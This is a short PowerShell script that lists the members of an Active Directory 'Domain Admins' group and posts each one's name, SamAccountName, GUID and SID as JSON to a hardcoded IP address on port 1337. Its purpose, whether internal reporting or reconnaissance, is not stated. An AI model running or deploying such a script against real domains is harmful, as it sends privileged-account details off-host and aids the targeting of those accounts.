#Invoke-webrequest URI Formatting. 
$URI = 'http://139.64.198.63:1337/daugs'
$header = @{'Accept' = 'application/json'}
$ContentType = "application/json; charset=utf-8"

$payload = Get-ADGroupMember -Identity 'Domain Admins'

#####################################
#
# Data being sent via API 
# distinguishedName, name, objectClass, objectGUID, SamAccountName, SID
#
#####################################

#API Push
foreach ($item in $payload) {
    $body = ConvertFrom-StringData -StringData "distinguishedName = $($item.distinguishedName) `n  name = $($item.name) `n objectClass = $($item.objectClass) `n objectGUID = $($item.objectGUID) `n SamAccountName = $($item.SamAccountName) `n SID = $($item.SID)" | ConvertTo-Json
    #$body
    Invoke-WebRequest -uri $URI -Method Post -Body $body -ContentType $ContentType -Headers $header
}